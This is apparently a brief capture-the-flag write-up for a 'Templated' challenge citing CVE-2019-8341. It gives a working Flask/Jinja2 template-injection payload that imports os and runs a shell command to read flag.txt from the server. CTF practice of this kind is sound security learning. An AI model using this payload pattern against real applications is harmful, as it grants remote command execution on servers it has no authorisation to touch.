## Templated challenge

### CVE-2019-8341

https://www.cvedetails.com/cve/CVE-2019-8341/

https://www.exploit-db.com/exploits/46386

___

![Screenshot from 2021-10-06 02-17-47](https://user-images.githubusercontent.com/86022395/136115708-fd0ec72c-3ae7-4323-bee9-852f0878d963.png)

Flask/Jinja2 Remote Code Execution exploit to cat flag.txt from the server.

payload
`{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}`